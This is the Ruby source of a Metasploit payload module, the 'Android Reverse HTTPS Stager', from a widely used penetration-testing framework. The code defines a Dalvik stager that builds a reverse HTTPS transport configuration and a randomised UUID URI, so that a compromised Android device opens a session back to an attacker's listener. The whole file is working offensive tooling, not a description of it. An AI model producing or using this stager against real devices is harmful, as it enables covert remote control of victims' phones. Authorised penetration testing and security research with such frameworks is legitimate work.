##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/uuid/options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Android
  include Msf::Payload::UUID::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Android Reverse HTTPS Stager',
      'Description' => 'Tunnel communication over HTTPS',
      'Author'      => ['anwarelmakrahy', 'OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Stager'      => {'Payload' => ''}
    ))
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_https(opts)
  end

  def generate_config_bytes(opts={})
    uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    opts[:uri] = generate_uri_uuid_mode(:init_java, uri_req_len)
    super(opts)
  end

end
